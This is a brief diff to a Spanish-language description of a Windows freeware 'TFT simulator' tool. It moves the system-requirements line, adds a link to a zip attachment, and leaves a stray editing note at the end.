@@ -32,6 +32,7 @@ Funciones principales:
 
 — Ventana de referencia rápida con la lista completa de comandos soportados, formatos de color y símbolos especiales, accesible desde la barra de herramientas.
 
-Requisitos del sistema: Sistema operativo: Windows 7 / 8 / 10 / 11
 
+Requisitos del sistema: Sistema operativo: Windows 7 / 8 / 10 / 11
+[tft_simulator.zip](https://github.com/user-attachments/files/26464330/tft_simulator.zip)
 Licencia: Freeware / Código abierto edita esto para poner todo
